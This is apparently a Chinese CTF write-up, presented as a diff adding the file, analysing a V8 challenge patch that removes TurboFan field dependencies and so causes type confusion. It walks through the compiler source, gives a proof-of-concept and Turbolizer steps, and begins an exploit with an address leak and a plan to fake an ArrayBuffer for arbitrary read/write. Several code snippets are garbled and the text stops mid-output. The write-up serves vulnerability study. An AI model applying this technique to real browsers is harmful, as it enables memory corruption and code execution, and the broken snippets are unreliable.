@@ -1,0 +1,215 @@
+>
+> 这道题主要涉及v8中的dependency机制，由于patch文件删除了某些添加依赖（dependency）的代码，导致在生成的JIT代码中，即使某些元素类型发生了变化也不会触发deoptimize，从而导致type
+> confusion。
+>
+>
+> 在这篇writeup里我主要记录我分析的过程，因为我事先从已有的wp中知道到了一些结论性的东西，所以我试图找到一个从零逐步寻找得到最后结果的逻辑，这个过程中可能会显得比较啰嗦。
+# 调试环境
+具体环境搭建步骤就不详述了，patch文件在[这里](https://github.com/Hpasserby/pwn_learn/tree/master/realworld/accessible)下载
+    git reset --hard eefa087eca9c54bdb923b8f5e5e14265f6970b22
+    gclient sync
+    git apply ../challenge.patch
+    ./tools/dev/v8gen.py x64.debug
+    ninja -C ./out.gn/x64.debug
+# 漏洞分析
+首先分析题目patch文件
+    diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc
+    index 0744138..1df06df 100644
+    --- a/src/compiler/access-info.cc
+    +++ b/src/compiler/access-info.cc
+    @@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
+           // The field type was cleared by the GC, so we don't know anything
+           // about the contents now.
+         }
+    +#if 0
+         unrecorded_dependencies.push_back(
+             dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
+                                                                       descriptor));
+    +#endif
+         if (descriptors_field_type->IsClass()) {
+           // Remember the field map, and try to infer a useful type.
+           Handle map(descriptors_field_type->AsClass(), isolate());
+    @@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
+       }
+       // TODO(turbofan): We may want to do this only depending on the use
+       // of the access info.
+    +#if 0
+       unrecorded_dependencies.push_back(
+           dependencies()->FieldTypeDependencyOffTheRecord(map_ref, descriptor));
+    +#endif
+       PropertyConstness constness;
+       if (details.IsReadOnly() && !details.IsConfigurable()) {
+         constness = PropertyConstness::kConst;
+       } else {
+         map_ref.SerializeOwnDescriptor(descriptor);
+    -    constness = dependencies()->DependOnFieldConstness(map_ref, descriptor);
+    +    constness = PropertyConstness::kConst;
+       }
+       Handle field_owner_map(map->FindFieldOwner(isolate(), descriptor),
+                                   isolate());
+`AccessInfoFactory::ComputeDataFieldAccessInfo`函数中，有两处`unrecorded_dependencies.push_back`被删除掉，同时让`constness`始终被赋值为`PropertyConstness::kConst`
+先浏览一下整个函数的功能（以下为patch后的代码），首先获取了`map`中的`instance_descriptors`(存储了对象属性的元信息)，然后通过`descriptor`定位到了一个具体的属性。
+    PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
+        Handle receiver_map, Handle map, MaybeHandle holder,
+        int descriptor, AccessMode access_mode) const {
+      ...
+      Handle descriptors(map->instance_descriptors(), isolate());
+      PropertyDetails const details = descriptors->GetDetails(descriptor);
+      ...
+      Representation details_representation = details.representation();
+      ...
+依次判断属性的类型，在进行一定的检查后，将属性加入到`unrecorded_dependencies`中。patch导致了一些本应该加入到`unrecorded_dependencies`的属性没有被加入进去。
+    if (details_representation.IsNone()) {
+        ...
+      }
+      ZoneVector unrecorded_dependencies(zone());
+      if (details_representation.IsSmi()) {
+        ...
+        unrecorded_dependencies.push_back(
+            dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
+                                                                      descriptor));
+      } else if (details_representation.IsDouble()) {
+        ...
+        unrecorded_dependencies.push_back(
+              dependencies()->FieldRepresentationDependencyOffTheRecord(
+                  map_ref, descriptor));
+      } else if (details_representation.IsHeapObject()) {
+        ...
+    #if 0
+        unrecorded_dependencies.push_back(
+            dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
+                                                                      descriptor));
+    #endif
+      } else {
+          ...
+      } 
+    #if 0
+      unrecorded_dependencies.push_back(
+          dependencies()->FieldTypeDependencyOffTheRecord(map_ref, descriptor));
+    #endif
+      ...
+最后，因为patch的修改，使得所有属性都被标注为`KConst`
+    PropertyConstness constness;
+      if (details.IsReadOnly() && !details.IsConfigurable()) {
+        constness = PropertyConstness::kConst;
+      } else {
+        map_ref.SerializeOwnDescriptor(descriptor);
+        constness = PropertyConstness::kConst;
+      }
+      Handle field_owner_map(map->FindFieldOwner(isolate(), descriptor),
+                                  isolate());
+      switch (constness) {
+        case PropertyConstness::kMutable:
+          return PropertyAccessInfo::DataField(
+              zone(), receiver_map, std::move(unrecorded_dependencies), field_index,
+              details_representation, field_type, field_owner_map, field_map,
+              holder);
+        case PropertyConstness::kConst:
+          return PropertyAccessInfo::DataConstant(
+              zone(), receiver_map, std::move(unrecorded_dependencies), field_index,
+              details_representation, field_type, field_owner_map, field_map,
+              holder);
+      }
+在这里，这个`unrecorded_dependencies`显然是问题的关键。
+继续跟踪函数返回值可以发现最终返回的是一个PropertyAccessInfo对象，而`unrecorded_dependencies`则是被初始化赋值给私有成员`unrecorded_dependencies_`
+    PropertyAccessInfo::PropertyAccessInfo(
+        Kind kind, MaybeHandle holder, MaybeHandle transition_map,
+        FieldIndex field_index, Representation field_representation,
+        Type field_type, Handle field_owner_map, MaybeHandle field_map,
+        ZoneVector>&& receiver_maps,
+        ZoneVector&& unrecorded_dependencies)
+        : kind_(kind),
+          receiver_maps_(receiver_maps),
+          unrecorded_dependencies_(std::move(unrecorded_dependencies)),
+          transition_map_(transition_map),
+          holder_(holder),
+          field_index_(field_index),
+          field_representation_(field_representation),
+          field_type_(field_type),
+          field_owner_map_(field_owner_map),
+          field_map_(field_map) {
+      DCHECK_IMPLIES(!transition_map.is_null(),
+                     field_owner_map.address() == transition_map.address());
+    }
+查找引用该私有成员的代码，主要有两个函数
+    bool PropertyAccessInfo::Merge(PropertyAccessInfo const* that,
+                                   AccessMode access_mode, Zone* zone)
+    void PropertyAccessInfo::RecordDependencies(
+        CompilationDependencies* dependencies)
+其中Merge函数中合并了两个`unrecorded_dependencies_`，RecordDependencies函数中将`unrecorded_dependencies_`转移到了`CompilationDependencies`类的私有成员`dependencies_`并清空了自身
+浏览`CompilationDependencies`类所在的`compilation-dependency.cc(.h)`文件，从注释中可以得知该类用于收集和安装正在生成的代码的依赖。
+在文件中查找`dependencies_`，发现主要引用的代码均为遍历`dependencies_`并调用`IsValid()`。
+`IsValid()`被`CompilationDependencies`的每个子类所重载，根据代码，其功能我的理解是用于判断某个元素是否已经改变或者过时。
+为了进一步了解该类的作用，我在搜索了引用该头文件的代码。可以发现，结果中几乎都是用于JIT优化的文件。
+逐个跟进文件查看后，我在`compilation-dependencies.cc`中注意到了以下部分代码。从代码中可以看出，Ruduce过程中，可以通过添加dependency的方式来将CheckMaps节点删除，我认为这便是道题的root
+cause.
+    Reduction TypedOptimization::ReduceCheckMaps(Node* node) {
+      // The CheckMaps(o, ...map...) can be eliminated if map is stable,
+      // o has type Constant(object) and map == object->map, and either
+      //  (1) map cannot transition further, or
+      //  (2) we can add a code dependency on the stability of map
+      //      (to guard the Constant type information).
+      Node* const object = NodeProperties::GetValueInput(node, 0);
+      Type const object_type = NodeProperties::GetType(object);
+      Node* const effect = NodeProperties::GetEffectInput(node);
+      base::Optional object_map =
+          GetStableMapFromObjectType(broker(), object_type);
+      if (object_map.has_value()) {
+        for (int i = 1; i op()->ValueInputCount(); ++i) {
+          Node* const map = NodeProperties::GetValueInput(node, i);
+          Type const map_type = NodeProperties::GetType(map);
+          if (map_type.IsHeapConstant() &&
+              map_type.AsHeapConstant()->Ref().equals(*object_map)) {
+            if (object_map->CanTransition()) {
+              dependencies()->DependOnStableMap(*object_map);
+            }
+            return Replace(effect);
+          }
+        }
+      }
+      return NoChange();
+    }
+    // Record the assumption that {map} stays stable.
+     void DependOnStableMap(const MapRef& map);
+## 总结
+结合一些资料，对dependency我的理解是
+对于JS类型的不稳定性，v8中有两种方式被用来保证runtime优化代码中对类型假设的安全性
+  1. 通过添加CheckMaps节点来对类型进行检查，当类型不符合预期时将会bail out
+  2. 以dependency的方式。将可能影响map假设的元素添加到dependencies中，通过检查这些dependency的改变来触发回调函数进行deoptimize
+该题目中，因为删除了某些添加dependency的代码，这就导致在代码runtime中，某些元素的改变不会被检测到从而没有deoptimize，最终造成type
+confusion。
+# 构造POC
+patch删除了`details_representation.IsHeapObject()`分支中的`unrecorded_dependencies.push_back`操作，这意味`HeapObject`类型不会被加入dependencies中。
+运行以下代码
+    var obj = {};
+    obj.c = {a: 1.1};
+    function leaker(o){
+        return o.c.a;
+    }
+    for (var i = 0; i  注意：修改obj.c时不能使用同属性名，如{a:
+> buf_to_leak}，因为事实上仍然存在一些依赖会影响到deoptimize，这点我没有找到更详细的解释，希望有师傅能够解释一下。参考：
+使用Turbolizer可视化程序IR，验证我们的猜想
+    cd tools/turbolizer
+    npm i
+    npm run-script build
+    python -m SimpleHTTPServer
+使用以下命令执行代码，并使用浏览器访问`127.0.0.1:8000`打开生成的文件
+    ./out.gn/x64.debug/d8 --trace-turbo ../../../exps/accessible/poc.js --trace-turbo-path ../
+可以看到，在TyperLowering时还存在两次CheckMaps，分别对应obj和obj.c
+而到了SimplifiedLowering时已经只有对obj的CheckMaps了，这说明obj.c的转为使用dependency的方式来进行检查。
+# 漏洞利用
+既然存在type confusion，那么我们可以用JSArray来伪造一个ArrayBuffer，即可控制到BackingStore，从而实现任意读写。
+## 对象地址泄露
+在poc中我们已经实现了该功能
+    var obj1 = {c: {x: 1.1}};
+    function leaker(o){
+        return o.c.x;
+    }
+    for(var i = 0; i  var arr = [1.1, 2.2, 3.3]
+    d8> %DebugPrint(arr)
+    DebugPrint: 0x831db04dd99: [JSArray]
+     - map: 0x2b36a3c82ed9  [FastProperties]
+     - prototype: 0x251f23191111 
+     - elements: 0x0831db04dd71  [PACKED_DOUBLE_ELEMENTS]
+     - length: 3
+     - properties: 0x25361adc0c71  {
